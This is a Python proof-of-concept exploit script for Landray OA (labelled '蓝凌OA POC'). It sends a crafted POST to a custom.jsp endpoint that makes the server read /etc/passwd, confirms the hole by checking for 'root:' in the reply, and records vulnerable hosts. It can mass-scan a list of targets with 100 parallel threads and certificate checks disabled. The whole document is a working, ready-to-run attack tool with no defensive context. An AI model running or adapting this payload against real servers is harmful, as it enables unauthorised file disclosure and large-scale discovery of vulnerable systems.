#-*- coding: utf-8 -*-
import argparse,sys,requests,time,os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
 _             _ _             _____  ___  
| |           | (_)           |  _  |/ _ \ 
| | __ _ _ __ | |_ _ __   __ _| | | / /_\ \
| |/ _` | '_ \| | | '_ \ / _` | | | |  _  |
| | (_| | | | | | | | | | (_| \ \_/ / | | |
|_|\__,_|_| |_|_|_|_| |_|\__, |\___/\_| |_/
                          __/ |            
                         |___/                                                                                                                                                                                                                                                                                                                                                             
                         tag:  蓝凌OA POC         @author：cy            
"""
    print(test)

def poc(target):
    url = target + "/sys/ui/extend/varkind/custom.jsp"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'var={"body":{"file":"file:///etc/passwd"}}'
    try:
        response = requests.post(url, data=data, headers=headers, verify=False, timeout=10)
        if "root:" in response.text and response.status_code == 200:
            print(f"[+] {target} is vulable")
            with open("resulet.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
            return True
        else:
            print(f"[-] {target} is not vulable")
            return False

    except:
        print(f"[*] {target} error")
        return False
def main():
    banner()
    parser = argparse.ArgumentParser(description='lanlingOA POC')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()